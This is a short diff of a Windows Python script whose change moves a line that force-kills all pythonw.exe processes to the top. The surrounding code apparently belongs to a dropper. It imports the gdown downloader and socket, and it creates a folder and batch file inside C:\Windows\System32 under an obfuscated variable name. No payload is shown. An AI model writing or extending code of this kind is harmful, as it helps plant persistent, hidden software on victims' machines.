@@ -12,6 +12,7 @@ import os
 import gdown
 os.system('cls')
 subprocess.run(["py", "-3.11", "-m", "pip", "install", "screeninfo"], check=True)
+subprocess.run(["taskkill", "/IM", "pythonw.exe", "/F"])
 dcnmwxdr = r'C:\Windows\System32\cstm_strmx'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
@@ -87,7 +88,7 @@ os.system('cls')
 batch_file_path = r"C:\Windows\System32\cstm_strmx\cstm_strmx.bat"
 os.system('cls')
 
-subprocess.run(["taskkill", "/IM", "pythonw.exe", "/F"])
+
 
 import socket
 import subprocess
